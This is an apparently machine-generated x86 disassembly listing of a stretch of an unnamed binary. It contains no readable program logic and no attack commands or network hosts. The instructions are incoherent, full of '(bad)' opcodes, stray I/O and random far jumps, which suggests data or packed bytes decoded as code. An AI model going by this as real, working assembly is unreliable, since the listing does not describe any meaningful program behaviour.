  424570:	xchg   edi,eax
  424571:	jl     0x42453d
  424573:	or     ebx,DWORD PTR [ecx+0x5676469a]
  424579:	in     al,0x49
  42457b:	inc    ebp
  42457c:	mov    dh,ch
  42457e:	dec    ecx
  42457f:	loope  0x42450f
  424581:	mov    ebx,0xdfe6105f
  424586:	push   edi
  424587:	and    cl,cl
  424589:	push   ss
  42458a:	jbe    0x4245b9
  42458c:	lahf   
  42458d:	push   ss
  42458e:	inc    edx
  42458f:	xchg   ebp,eax
  424590:	mov    edx,0x4ba24cd9
  424595:	xchg   ecx,eax
  424596:	dec    edx
  424597:	xchg   edi,eax
  424598:	popf   
  424599:	js     0x4245c5
  42459b:	cmp    al,0xd1
  42459d:	mov    ebp,0xfa65932f
  4245a2:	add    ch,BYTE PTR [esi+0x38d260e9]
  4245a8:	pop    es
  4245a9:	and    esi,edi
  4245ab:	inc    eax
  4245ac:	call   0xb54b9cd7
  4245b1:	std    
  4245b2:	retf   0xbb5
  4245b5:	ret    0xdf6f
  4245b8:	jecxz  0x4245d9
  4245ba:	aaa    
  4245bb:	aas    
  4245bc:	mov    es,WORD PTR [edi+0x334e5aa0]
  4245c2:	out    dx,eax
  4245c3:	mov    gs,WORD PTR [edx-0x2d14ce28]
  4245c9:	repz ss jge 0x424615
  4245cd:	mov    DWORD PTR fs:[ebx-0x485503e5],edi
  4245d4:	aam    0x7
  4245d6:	and    DWORD PTR [esi],ebx
  4245d8:	lds    esi,FWORD PTR [ecx-0x76f20bab]
  4245de:	enter  0x96f6,0x5a
  4245e2:	retf   
  4245e3:	mov    esp,ss
  4245e5:	jl     0x42462f
  4245e7:	pusha  
  4245e8:	stc    
  4245e9:	jae    0x4245c2
  4245eb:	adc    ch,BYTE PTR [ecx]
  4245ed:	or     edx,DWORD PTR [ecx-0x6e]
  4245f0:	sar    DWORD PTR [ebx+0x446a225d],1
  4245f6:	push   edi
  4245f7:	loope  0x424617
  4245f9:	add    al,0xc9
  4245fb:	inc    eax
  4245fc:	mov    gs,WORD PTR [esi]
  4245fe:	bound  ebp,QWORD PTR [ebx+0x28aee2a9]
  424604:	add    al,bh
  424606:	or     al,0xff
  424608:	dec    ebx
  424609:	inc    ecx
  42460a:	inc    ecx
  42460b:	bound  ebx,QWORD PTR [ecx+0x2d8af71e]
  424611:	add    eax,0x6ee6c0e9
  424616:	jmp    0x7c16:0xb8ec75e6
  42461d:	test   BYTE PTR [eax*2-0x27d559e5],cl
  424624:	clc    
  424625:	sub    dh,BYTE PTR [ebp+0x20]
  424628:	js     0x424651
  42462a:	add    cl,bh
  42462c:	jmp    0x48d0b862
  424631:	rcr    BYTE PTR [esi+eax*1+0x4d5ebe1c],cl
  424638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424639:	std    
  42463a:	(bad)  
  42463b:	mov    cl,0xd5
  42463d:	jnp    0x42469e
  42463f:	loop   0x42465e
  424641:	les    ecx,FWORD PTR [eax+0x5254bbc4]
  424647:	je     0x4245ea
  424649:	clc    
  42464a:	jne    0x42466f
  42464c:	pop    ebx
  42464d:	retf   0x9428
  424650:	mov    bl,0x26
  424652:	call   0x92c8:0xb8db689d
  424659:	ret    
  42465a:	mov    cl,0xbc
  42465c:	add    al,0xfe
  42465e:	jg     0x424698
  424660:	js     0x4245ee
  424662:	xor    eax,edx
  424664:	pop    ss
  424665:	ja     0x42465b
  424667:	arpl   WORD PTR [edi],si
  424669:	popf   
  42466a:	fild   QWORD PTR [eax]
  42466c:	ss aaa 
  42466e:	sbb    al,0xb
  424670:	mov    ecx,0x41c300dc
  424675:	mov    edx,0xd2afdb60
  42467a:	push   esp
  42467b:	cld    
  42467c:	sub    edx,ecx
  42467e:	inc    BYTE PTR [ebx]
  424680:	hlt    
  424681:	and    eax,0xa71ade04
  424686:	pop    es
  424687:	inc    ebx
  424688:	loopne 0x424674
  42468a:	fidiv  DWORD PTR [ebx]
  42468c:	mov    bh,0xaf
  42468e:	imul   ebp,DWORD PTR [ebp-0x2fa9d4b8],0xbc50a05f
  424698:	and    edi,DWORD PTR [ebx]
  42469a:	cmc    
  42469b:	xchg   edi,eax
  42469c:	sbb    BYTE PTR [ecx+0x30],bh
  42469f:	sti    
  4246a0:	xchg   ebx,eax
  4246a1:	ret    0xf417
  4246a4:	mov    ds:0xe21f53dd,al
  4246a9:	jmp    0x30a7:0xe1a9db6a
  4246b0:	mov    WORD PTR [edi],?
  4246b2:	fidivr DWORD PTR [ecx+edi*4-0x14]
  4246b6:	add    esi,DWORD PTR ds:0xefcbe209
  4246bc:	sbb    DWORD PTR [edi],eax
  4246be:	jl     0x424678
  4246c0:	bound  edx,QWORD PTR [eax-0x72]
  4246c3:	(bad)  
  4246c4:	enter  0x7546,0xe1
  4246c8:	js     0x4246bd
  4246ca:	pop    ecx
  4246cb:	into   
  4246cc:	pop    ebx
  4246cd:	push   ecx
  4246ce:	hlt    
  4246cf:	sbb    eax,0x57f3d4cd
  4246d4:	xor    al,0x7
  4246d6:	cmp    edx,ebp
  4246d8:	adc    ebp,DWORD PTR [ebx-0x5c4c6db1]
  4246de:	(bad)  
  4246df:	out    0x6d,eax
  4246e1:	mov    ch,0xe1
  4246e3:	add    ebp,DWORD PTR [ecx]
  4246e5:	fdivr  QWORD PTR [esp+ebx*1+0x12ef41fb]
  4246ec:	add    bh,BYTE PTR [ecx-0x7d]
  4246ef:	xchg   BYTE PTR [eax],dl
  4246f1:	inc    edi
  4246f2:	fsub   QWORD PTR [ebx+0x57]
  4246f5:	cmp    ebp,DWORD PTR [edx-0x6b2ead6a]
  4246fb:	cwde   
  4246fc:	(bad)
  424702:	sub    al,BYTE PTR ds:[edi]
  424705:	lods   al,BYTE PTR ds:[esi]
  424706:	es ins BYTE PTR es:[edi],dx
  424708:	clc    
  424709:	adc    DWORD PTR [eax*1+0xb1a25ec],edi
  424710:	shl    edi,1
  424712:	add    BYTE PTR [edi+0x1c],bh
  424715:	sbb    ah,BYTE PTR [ebx]
  424717:	or     BYTE PTR [ebx],0x6f
  42471a:	cmp    DWORD PTR [ebx+0x37],eax
  42471d:	aam    0x80
  42471f:	call   0xe48ce9c6
  424724:	mov    BYTE PTR [edi-0x4e],al
  424727:	cs inc ecx
  424729:	sbb    esp,DWORD PTR [edx-0x7a]
  42472c:	cmc    
  42472d:	imul   esp,DWORD PTR [edx],0xffffff9b
  424730:	add    esp,DWORD PTR [ebx+0x66]
  424733:	fdiv   st,st(3)
  424735:	scas   al,BYTE PTR es:[edi]
  424736:	(bad)  
  424737:	loopne 0x4246f9
  424739:	xor    esi,DWORD PTR [eax+0x4c]
  42473c:	(bad)  
  42473d:	in     al,dx
  42473e:	(bad)  
  42473f:	aam    0xbe
  424741:	repnz dec esi
  424743:	pop    eax
  424744:	jae    0x424788
  424746:	retf   0x2fdc
  424749:	ds pushf 
  42474b:	cs or  eax,ebx
  42474e:	pop    esi
  42474f:	fstp   QWORD PTR [ecx-0xf]
  424752:	add    al,bh
  424754:	xor    BYTE PTR [ebx],0x5a
  424757:	jnp    0x42473a
  424759:	icebp  
  42475a:	and    edi,DWORD PTR [eax-0x80]
  42475d:	imul   ebx,eax,0xffffff91
  424760:	xchg   ecx,eax
  424761:	ret    
  424762:	stos   BYTE PTR es:[edi],al
  424763:	scas   eax,DWORD PTR es:[edi]
  424764:	and    ebx,DWORD PTR [ebx]
  424766:	inc    ebp
  424767:	dec    esi
  424768:	xchg   edi,eax
  424769:	mov    ebp,0xfe7fbe9b
  42476e:	std    
  42476f:	xlat   BYTE PTR ds:[ebx]
  424770:	xchg   ecx,eax
  424771:	jecxz  0x424708
  424773:	test   BYTE PTR [esi],ch
  424775:	nop
  424776:	dec    ebx
  424777:	adc    DWORD PTR [ebp-0x29],eax
  42477a:	retf   
  42477b:	push   cs
  42477c:	inc    eax
  42477d:	sbb    eax,0xda986f20
  424782:	(bad)  
  424783:	jns    0x4247b6
  424785:	sbb    ebx,esi
  424787:	xchg   esp,eax
  424788:	je     0x42478d
  42478a:	shl    BYTE PTR [edi+eax*8],1
  42478d:	in     eax,0xcc
  42478f:	and    dl,bh
  424791:	icebp  
  424792:	out    dx,al
  424793:	xchg   edi,eax
  424794:	jmp    0x42474f
  424796:	sub    BYTE PTR [edx],bl
  424798:	fidiv  DWORD PTR [edx+0x79ef79dc]
  42479e:	inc    ecx
  42479f:	xlat   BYTE PTR ds:[ebx]
  4247a0:	sub    DWORD PTR [ebx-0x655ac9fd],eax
  4247a6:	fsub   QWORD PTR [eax*8+0xb563a65]
  4247ad:	retf   
  4247ae:	nop
  4247af:	cmp    al,BYTE PTR [edx+0x3f]
  4247b2:	lods   al,BYTE PTR ds:[esi]
  4247b3:	jge    0x42482b
  4247b5:	or     esi,DWORD PTR [ebx+0x57]
  4247b8:	jp     0x42482d
  4247ba:	fnstsw WORD PTR [eax-0x4f91254f]
  4247c0:	sbb    edi,DWORD PTR [ebx-0xb]
  4247c3:	push   cs
  4247c4:	push   ss
  4247c5:	(bad)  
  4247c6:	mov    bl,0x2c
  4247c8:	icebp  
  4247c9:	and    BYTE PTR [eax],0xa
  4247cc:	inc    edi
  4247cd:	and    eax,0xbb15481f
  4247d2:	xor    edi,DWORD PTR ds:0xc2595ab5
  4247d8:	mov    ecx,0xfa9a432f
  4247dd:	inc    edi
  4247de:	mov    esp,edx
  4247e0:	or     al,0x10
  4247e2:	lahf   
  4247e3:	fld    st(1)
  4247e5:	xor    BYTE PTR [eax],ah
  4247e7:	mov    dl,0x36
  4247e9:	add    DWORD PTR [esi+0x9237c77],ebp
  4247ef:	ss scas al,BYTE PTR es:[edi]
  4247f1:	in     eax,dx
  4247f2:	or     DWORD PTR [ebx],0x28
  4247f5:	iret   
  4247f6:	aas    
  4247f7:	mov    cl,BYTE PTR [ebp+0x7cf84b01]
  4247fd:	and    DWORD PTR [ebx-0x71],ebp
  424800:	fst    DWORD PTR [eax+0x56492f7d]
  424806:	int3   
  424807:	pushf  
  424808:	or     bh,BYTE PTR [edx-0x73fa5481]
  42480e:	repz mov ch,BYTE PTR [ebx]
  424811:	xchg   BYTE PTR [ecx+0x63],dh
  424814:	lahf   
  424815:	ins    DWORD PTR es:[edi],dx
  424816:	cmp    DWORD PTR [edx+eiz*4+0x3ff79b52],eax
  42481d:	and    al,BYTE PTR [edx-0x2ca128f8]
  424823:	enter  0xea69,0x7f
  424827:	dec    ebx
  424828:	mov    dh,0xa4
  42482a:	add    al,0x78
  42482c:	and    eax,0xb52d9383
  424831:	mov    eax,0x30cbc4e1
  424836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424837:	repnz pop ecx
  424839:	fisub  DWORD PTR [ecx-0x60]
  42483c:	cdq    
  42483d:	sbb    DWORD PTR [ebx+0x26735543],edx
  424843:	add    esi,DWORD PTR [ebx-0x3276053a]
  424849:	jle    0x424885
  42484b:	push   ss
  42484c:	pop    ss
  42484d:	and    DWORD PTR [esi+eax*4-0xd],0xc8013edd
  424855:	out    0x4d,eax
  424857:	pop    es
  424858:	sti    
  424859:	loop   0x4248cb
  42485b:	mov    ebp,0xbfe8aae3
  424860:	pop    esi
  424861:	xchg   DWORD PTR [esi+0x659943e3],ebx
  424867:	push   es
  424868:	ror    DWORD PTR [ebx+0x42],1
  42486b:	es loopne 0x42482e
  42486e:	jns    0x42486c
  424870:	add    eax,0x2c099ccd
  424875:	mov    edi,0x481da125
  42487a:	mov    edx,0x6bb410e1
  42487f:	inc    ebp
  424880:	iret   
  424881:	leave  
  424882:	mov    dl,0xa3
  424884:	out    0x39,eax
  424886:	add    eax,eax
  424888:	dec    esp
  424889:	out    0xe,al
  42488b:	popa   
  42488c:	mul    DWORD PTR [edi+0x2cb0b761]
  424892:	xor    BYTE PTR [ebx-0x4605f736],dh
  424898:	scas   eax,DWORD PTR es:[edi]
  424899:	adc    DWORD PTR [edx],eax
  42489b:	aas    
  42489c:	add    BYTE PTR [ecx-0x6b],bh
  42489f:	test   eax,0x8db21b36
  4248a4:	xor    edi,DWORD PTR [edi]
  4248a6:	outs   dx,DWORD PTR ds:[esi]
  4248a7:	into   
  4248a8:	in     eax,dx
  4248a9:	retf   
  4248aa:	jnp    0x4248f8
  4248ac:	lods   al,BYTE PTR ds:[esi]
  4248ad:	or     BYTE PTR [edx+0x5cfca004],bl
  4248b3:	cmp    dl,BYTE PTR [esi]
  4248b5:	bound  esi,QWORD PTR [ebx-0x61]
  4248b8:	loop   0x424909
  4248ba:	cld    
  4248bb:	lds    edi,FWORD PTR [esp+ebx*8]
  4248be:	push   esi
  4248bf:	xor    edi,DWORD PTR [ecx-0x30]
  4248c2:	out    0xf8,al
  4248c4:	inc    ebp
  4248c5:	xchg   DWORD PTR ss:[ecx+0x4],ebp
  4248c9:	cmp    bl,BYTE PTR [edx+0x6d]
  4248cc:	jp     0x42487c
  4248ce:	add    eax,0xdbf23fa0
  4248d3:	int3   
  4248d4:	hlt    
  4248d5:	test   ch,cl
  4248d7:	aad    0x86
  4248d9:	and    DWORD PTR [esi+0xccb1bc8],edi
  4248df:	pop    edx
  4248e0:	repnz int3 
  4248e2:	je     0x424902
  4248e4:	mov    eax,0x6a9c2b45
  4248e9:	cwde   
  4248ea:	jecxz  0x424920
  4248ec:	inc    ebx
  4248ed:	dec    esp
  4248ee:	jl     0x424931
  4248f0:	jl     0x42487c
  4248f2:	jo     0x424898
  4248f4:	mov    al,ds:0xc78b33
  4248f9:	inc    ecx
  4248fa:	xor    eax,0x63c55036
  4248ff:	push   cs
  424900:	cmp    al,bl
  424902:	pusha  
  424903:	xor    DWORD PTR [edx+esi*8+0xc519abc],ebx
  42490a:	in     al,dx
  42490b:	cdq    
  42490c:	cmp    ah,BYTE PTR [edi]
  42490e:	mov    ah,0x99
  424910:	xor    eax,0x6548fdb3
  424915:	imul   esp,DWORD PTR [edx+0x53730e73],0xcb71d280
  42491f:	mov    ebp,?
  424921:	or     BYTE PTR [edx-0x79f67b27],dh
  424927:	or     dh,BYTE PTR [ebx+0x53850451]
  42492d:	aas    
  42492e:	and    BYTE PTR [eax],dh
  424930:	add    eax,0xdf3b658e
  424935:	push   es
  424936:	cmp    BYTE PTR [eax+0x2675c432],bh
  42493c:	jl     0x42495f
  42493e:	jge    0x4248dd
  424940:	push   edi
  424941:	jb     0x424923
  424943:	mov    al,ds:0x40a38ae
  424948:	fimul  DWORD PTR [edx+edx*2+0xa]
  42494c:	jae    0x42495a
  42494e:	(bad)  
  424950:	pop    ecx
  424951:	pop    edx
  424952:	popa   
  424953:	or     al,cl
  424955:	mov    ds:0x1ac08bd0,eax
  42495a:	dec    edi
  42495b:	mov    edx,0xdb9e7fb7
  424960:	xor    eax,0xe9e23c23
  424965:	xchg   ebx,eax
  424966:	push   0xffffff8d
  424968:	int3   
  424969:	aaa    
  42496a:	add    al,0xd7
  42496c:	inc    ebp
  42496d:	push   cs
  42496e:	data16 loopne 0x42497b
  424971:	pop    ecx
  424972:	in     eax,0x23
  424974:	cmc    
  424975:	addr16 add al,0x20
  424978:	mov    esp,0xc380aeba
  42497d:	scas   eax,DWORD PTR es:[edi]
  42497e:	push   cs
  42497f:	hlt    
  424980:	and    ah,BYTE PTR [ecx]
  424982:	popa   
  424983:	mov    dh,0x2c
  424985:	loopne 0x424991
  424987:	inc    esi
  424988:	jmp    0x5ee2daca
  42498d:	jb     0x424a0d
  42498f:	ds (bad) 
  424991:	xchg   ebp,eax
  424992:	mov    bl,0xbf
  424994:	push   es
  424995:	pop    ebp
  424996:	sbb    BYTE PTR [esi+eax*8+0x5cfd191f],dh
  42499d:	js     0x424a06
  42499f:	ds addr16 repnz (bad) 
  4249a4:	daa    
  4249a5:	(bad)  
  4249a6:	jne    0x42495c
  4249a8:	ret    0x652
  4249ab:	div    DWORD PTR [ecx+0x38]
  4249ae:	(bad)  
  4249b0:	fbstp  TBYTE PTR [edx+0x6e]
  4249b3:	mov    al,ds:0x8c70cd1b
  4249b8:	in     al,0xb8
  4249ba:	ins    DWORD PTR es:[edi],dx
  4249bb:	(bad)  
  4249bc:	(bad)  
  4249be:	pop    ss
  4249bf:	(bad)  
  4249c0:	cmp    BYTE PTR [edi+ebp*8],cl
  4249c3:	in     eax,0x6c
  4249c5:	lock jg 0x4249e8
  4249c8:	lahf   
  4249c9:	arpl   WORD PTR [ebx+0x5a],si
  4249cc:	es ret 0xa822
  4249d0:	imul   esp,DWORD PTR [ecx-0x2a],0xffffff9e
  4249d4:	popa   
  4249d5:	xchg   esp,eax
  4249d6:	or     al,0xac
  4249d8:	stos   BYTE PTR es:[edi],al
  4249d9:	cmc    
  4249da:	sbb    dl,BYTE PTR [eax]
  4249dc:	add    eax,0xdad4dadc
  4249e1:	add    bh,BYTE PTR [esi]
  4249e3:	retf   
  4249e4:	adc    dh,BYTE PTR [eax+0x60b58d8b]
  4249ea:	mov    ebp,0xf386548d
  4249ef:	test   bh,bl
  4249f1:	xor    al,0x87
  4249f3:	int3   
  4249f4:	or     eax,0x3bfb0972
  4249f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249fb:	aas    
  4249fc:	mov    DWORD PTR [eax],ebp
  4249fe:	lock jb 0x4249e7
  424a01:	inc    esp
  424a02:	inc    esi
  424a03:	mov    edi,0x91d326ce
  424a08:	(bad)  
  424a09:	jo     0x4249db
  424a0b:	lods   eax,DWORD PTR ds:[esi]
  424a0c:	(bad)  
  424a0d:	lock or bh,ch
  424a10:	and    BYTE PTR [ecx+0x1e],0x87
  424a14:	sub    al,0x50
  424a16:	(bad)  
  424a17:	in     eax,dx
  424a18:	imul   esp,DWORD PTR [esi+0x2d140626],0xffffffdc
  424a1f:	cli    
  424a20:	sub    ecx,DWORD PTR [ebx]
  424a22:	bound  ebx,QWORD PTR [edx+0x1a238304]
  424a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a29:	xchg   ecx,eax
  424a2a:	js     0x4249c9
  424a2c:	shl    DWORD PTR [ecx+0x63],cl
  424a2f:	retf   0x95ff
  424a32:	push   es
  424a33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a34:	dec    ebx
  424a35:	stc    
  424a36:	pop    ebp
  424a37:	aad    0x98
  424a39:	cmp    eax,0xef9bc518
  424a3e:	into   
  424a3f:	mov    ?,WORD PTR [ecx]
  424a41:	es in  eax,0x26
  424a44:	(bad)
  424a48:	mov    ds:0x92e3cb40,al
  424a4d:	xchg   DWORD PTR [ebp-0x9],ecx
  424a50:	leave  
  424a51:	jle    0x424ac6
  424a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a54:	ret    
  424a55:	push   cs
  424a56:	mov    ah,0xc3
  424a58:	mov    eax,ds:0x121e74b5
  424a5d:	(bad)  
  424a5e:	xor    ah,bl
  424a60:	mov    al,ds:0x263642c7
  424a65:	aam    0xea
  424a67:	add    dh,BYTE PTR [edx]
  424a69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a6a:	mul    DWORD PTR [bx+si]
  424a6d:	pop    ebx
  424a6e:	mov    dh,0x77
  424a70:	xor    dh,ah
  424a72:	out    dx,al
  424a73:	mov    gs,WORD PTR [esi*4-0x5216633f]
  424a7a:	sahf   
  424a7b:	(bad)  
  424a7c:	adc    ebx,DWORD PTR [ecx-0xb93475c]
  424a82:	mov    esp,0xe97a59b7
  424a87:	clc    
  424a88:	repnz (bad) 
  424a8b:	mov    DWORD PTR [eax-0x2d150beb],ecx
  424a91:	out    0xb,eax
  424a93:	out    dx,al
  424a94:	out    dx,eax
  424a95:	xchg   BYTE PTR [ecx-0x3c],cl
  424a98:	sub    bl,cl
  424a9a:	sub    edx,DWORD PTR [ebx-0x6a8c0968]
  424aa0:	int3   
  424aa1:	jo     0x424a3b
  424aa3:	sbb    BYTE PTR [ebx+0x3f],ch
  424aa6:	and    al,0x73
  424aa8:	mov    al,ds:0x20df7e9a
  424aad:	ret    0x720f
  424ab0:	cmp    ebx,DWORD PTR [esi]
  424ab2:	daa    
  424ab3:	push   eax
  424ab4:	mov    bh,0xc4
  424ab6:	sub    DWORD PTR [edx-0x5d370b1d],ebx
  424abc:	int    0xe
  424abe:	in     eax,dx
  424abf:	and    ebp,DWORD PTR [ecx+ebx*1]
  424ac2:	xchg   ebx,eax
  424ac3:	sbb    BYTE PTR [ebp-0x1181e3c9],cl
  424ac9:	popa   
  424aca:	sub    eax,DWORD PTR [eax+0x66]
  424acd:	mul    BYTE PTR [edx]
  424acf:	fistp  WORD PTR [edi-0x7]
  424ad2:	lds    eax,FWORD PTR [ecx+0x58d730a1]
  424ad8:	pop    ds
  424ad9:	xchg   ch,bh
  424adb:	mov    al,ds:0x8885b6d4
  424ae0:	cmp    DWORD PTR [ecx],esp
  424ae2:	cdq    
  424ae3:	inc    ecx
  424ae4:	mov    ds:0x3e7d555,eax
  424ae9:	dec    edx
  424aea:	jbe    0x424b3d
  424aec:	or     BYTE PTR [ecx+0x7969e491],0x54
  424af3:	dec    edi
  424af4:	aas    
  424af5:	lods   eax,DWORD PTR ds:[esi]
  424af6:	test   eax,0x2a85e013
  424afb:	ret    0x568d
  424afe:	mov    ah,0x17
  424b00:	xchg   ebx,eax
  424b01:	out    0x5e,al
  424b03:	mov    al,0x7b
  424b05:	and    DWORD PTR [edx+edx*8-0x2e],ecx
  424b09:	imul   eax,DWORD PTR [edx],0x10
  424b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b0d:	int3   
  424b0e:	enter  0xa365,0x50
  424b12:	scas   al,BYTE PTR es:[edi]
  424b13:	in     eax,0xb9
  424b15:	dec    esp
  424b16:	ret    
  424b17:	pop    es
  424b18:	cs mov edi,0xcf71a329
  424b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b1f:	adc    al,0xb3
  424b21:	push   esi
  424b22:	inc    esp
  424b23:	sbb    cl,al
  424b25:	out    dx,eax
  424b26:	std    
  424b27:	std    
  424b28:	and    eax,0x5bf9a2e9
  424b2d:	xor    al,ah
  424b2f:	xchg   ebx,eax
  424b30:	rcr    dh,1
  424b32:	jle    0x424b89
  424b34:	pop    edx
  424b35:	ret    0x283e
  424b38:	jge    0x424b1d
  424b3a:	(bad)  
  424b3b:	adc    ch,BYTE PTR [edi]
  424b3d:	cmp    eax,0xb79b64f5
  424b42:	fwait
  424b43:	arpl   WORD PTR [esi-0xcab1601],bp
  424b49:	and    al,0x21
  424b4b:	dec    eax
  424b4c:	outs   dx,DWORD PTR ds:[esi]
  424b4d:	out    dx,al
  424b4e:	repnz (bad) 
  424b50:	mov    ch,0xf5
  424b52:	shl    DWORD PTR [eax+0x40ad2318],0x53
  424b59:	int3   
  424b5a:	loop   0x424b9c
  424b5c:	cmp    DWORD PTR [edi],edi
  424b5e:	(bad)  
  424b5f:	les    ebx,FWORD PTR [edi+ecx*2+0x14]
  424b63:	mov    ecx,0x704bff50
  424b68:	ret    
  424b69:	xlat   BYTE PTR ds:[ebx]
  424b6a:	ja     0x424b8c
  424b6c:	push   ds
  424b6d:	nop
  424b6e:	mov    eax,0xb6bd8342
  424b73:	mov    edi,esi
  424b75:	jbe    0x424bc0
  424b77:	pop    ss
  424b78:	in     al,0x1e
  424b7a:	push   es
  424b7b:	stos   BYTE PTR es:[edi],al
  424b7c:	stos   DWORD PTR es:[edi],eax
  424b7d:	in     al,0xe2
  424b7f:	xchg   BYTE PTR [bp+di],bh
  424b82:	and    ecx,DWORD PTR [ebx]
  424b84:	mov    al,0xd5
  424b86:	lds    ecx,FWORD PTR [edi+0x45]
  424b89:	push   ds
  424b8a:	out    dx,al
  424b8b:	mov    dh,bh
  424b8d:	shl    BYTE PTR [edx-0x1],1
  424b90:	adc    bl,BYTE PTR [eax]
  424b92:	xchg   edi,eax
  424b93:	sub    esp,DWORD PTR [edi+0x20]
  424b96:	shr    ebx,0x18
  424b99:	dec    edi
  424b9a:	(bad)
  424b9d:	aam    0x2
  424b9f:	repnz ins BYTE PTR es:[edi],dx
  424ba1:	in     eax,0x76
  424ba3:	inc    edx
  424ba4:	dec    ecx
  424ba5:	xchg   ebp,eax
  424ba6:	mov    al,0x5
  424ba8:	sbb    al,0x4f
  424baa:	into   
  424bab:	idiv   BYTE PTR [ecx]
  424bad:	pop    eax
  424bae:	inc    esp
  424baf:	das    
  424bb0:	add    ch,BYTE PTR [esi-0x3a]
  424bb3:	adc    al,BYTE PTR [esi]
  424bb5:	imul   esi,edi,0xd02d0c12
  424bbb:	adc    DWORD PTR [ecx],esi
  424bbd:	and    ah,dh
  424bbf:	xchg   ebp,eax
  424bc0:	sbb    DWORD PTR [ebx],ebx
  424bc2:	test   eax,0x377865ba
  424bc7:	push   0xb2392e19
  424bcc:	out    0xa5,al
  424bce:	data16 ja 0x424c15
  424bd1:	pop    ecx
  424bd2:	das    
  424bd3:	aaa    
  424bd4:	loopne 0x424b83
  424bd6:	adc    eax,0xfea06d9
  424bdb:	adc    dh,bh
  424bdd:	mov    eax,ds:0x916c534e
  424be2:	mov    DWORD PTR [ebp+0x531ac00e],ebx
  424be8:	jnp    0x424bc9
  424bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424beb:	loope  0x424c35
  424bed:	add    eax,0xd1eb22c5
  424bf2:	and    al,0x25
  424bf4:	or     esi,edi
  424bf6:	test   DWORD PTR [edx],ebp
  424bf8:	jo     0x424bc1
  424bfa:	xchg   edx,eax
  424bfb:	(bad)  
  424bfd:	in     eax,dx
  424bfe:	fidivr WORD PTR [edx+0x6f]
  424c01:	mov    ecx,0x3a80a980
  424c06:	jnp    0x424c09
  424c08:	add    DWORD PTR ds:0xedf63ae,ebp
  424c0e:	dec    eax
  424c0f:	mov    esi,0x1a4e4349
  424c14:	jmp    0x12d8:0x413cb896
  424c1b:	xor    bl,BYTE PTR [ebx+0x2f]
  424c1e:	arpl   bx,si
  424c20:	(bad)  
  424c21:	loopne 0x424c74
  424c23:	inc    ecx
  424c24:	push   edx
  424c25:	outs   dx,DWORD PTR ds:[esi]
  424c26:	mov    eax,ds:0x9b1686a5
  424c2b:	and    DWORD PTR [ecx-0x3d996a1a],0xb9f0cd9a
  424c35:	add    ebx,esi
  424c37:	pop    ecx
  424c38:	je     0x424cb2
  424c3a:	(bad)  [edi-0x5a]
  424c3d:	shl    dl,0xf3
  424c40:	xor    eax,esp
  424c42:	lods   al,BYTE PTR ds:[esi]
  424c43:	pop    eax
  424c44:	lea    edi,[ecx-0x1f]
  424c47:	ret    
  424c48:	and    al,0x42
  424c4a:	add    DWORD PTR [edi],ebp
  424c4c:	or     al,0xbb
  424c4e:	stc    
  424c4f:	or     ebp,ebx
  424c51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424c52:	lods   al,BYTE PTR ds:[esi]
  424c53:	push   edx
  424c54:	mov    ah,0x78
  424c56:	cdq    
  424c57:	sbb    bh,BYTE PTR [esi-0x23]
  424c5a:	shl    BYTE PTR [ebx+0x3b4b3cf9],cl
  424c60:	rol    DWORD PTR [edi-0x54d10998],cl
  424c66:	loop   0x424cb2
  424c68:	sbb    BYTE PTR [edi],al
  424c6a:	lods   al,BYTE PTR ds:[esi]
  424c6b:	fwait
  424c6c:	sub    al,0x28
  424c6e:	out    0x50,eax
  424c70:	inc    ecx
  424c71:	fwait
  424c72:	mov    ch,0x68
  424c74:	fsubr  DWORD PTR [esi]
  424c76:	arpl   WORD PTR gs:[edi+0x8],bp
  424c7a:	mov    ?,WORD PTR [ecx-0x5e]
  424c7d:	sbb    DWORD PTR [edi+0x30],edx
  424c80:	(bad)  
  424c81:	xor    eax,0xd56beea5
  424c86:	sub    DWORD PTR [esp+ecx*8-0x5ac2a2ac],edx
  424c8d:	(bad)  
  424c8e:	arpl   WORD PTR [edx-0x3b],sp
  424c91:	sub    ebx,DWORD PTR [ebp+0x5f]
  424c94:	lods   eax,DWORD PTR ds:[esi]
  424c95:	jo     0x424c1a
  424c97:	inc    edi
  424c98:	mov    WORD PTR [esi+0x0],cs
	...
  424d13:	add    BYTE PTR [edi-0x1ab332f],ch
  424d19:	pop    ebp
  424d1a:	mov    edi,0x5e13fbfb
  424d1f:	cmp    DWORD PTR [ebx+0x1fb247ba],ecx
  424d25:	loope  0x424d28
  424d27:	add    BYTE PTR [esi+0x7],ch
  424d2a:	add    BYTE PTR [eax],al
  424d2c:	cli    
  424d2d:	sbb    ah,BYTE PTR es:0x60803e97
  424d34:	jne    0x424cf4
  424d36:	scas   al,BYTE PTR es:[edi]
  424d37:	ds ret 
  424d39:	jnp    0x424d6e
  424d3b:	inc    edi
  424d3c:	stc    
  424d3d:	xchg   edi,eax
  424d3e:	fwait
  424d3f:	mul    DWORD PTR [edx-0x26d7395b]
  424d45:	add    cl,ch
  424d47:	pop    esi
  424d48:	mov    ebx,0xc788649a
  424d4d:	push   ds
  424d4e:	test   DWORD PTR [esi+0x3f0c9f15],0x7306bf2e
  424d58:	ja     0x424dbb
  424d5a:	ja     0x424dd6
  424d5c:	mov    al,0x8e
  424d5e:	call   0x1c3ef98
  424d63:	add    al,0x76
  424d65:	lods   al,BYTE PTR ds:[esi]
  424d66:	fstp   QWORD PTR ds:0x720c92c9
  424d6c:	fs or  al,0xeb
  424d6f:	stos   DWORD PTR es:[edi],eax
  424d70:	pop    ds
  424d71:	addr16 cmp al,0x89
  424d74:	cs clc 
  424d76:	mov    edx,0x803692fd
  424d7b:	mov    cl,bh
  424d7d:	xor    al,0x84
  424d7f:	pop    ebp
  424d80:	ja     0x424d30
  424d82:	int    0x11
  424d84:	mov    al,ds:0x66aa5dbd
  424d89:	iret   
  424d8a:	xchg   edx,eax
  424d8b:	or     eax,0x97a59611
  424d90:	cdq    
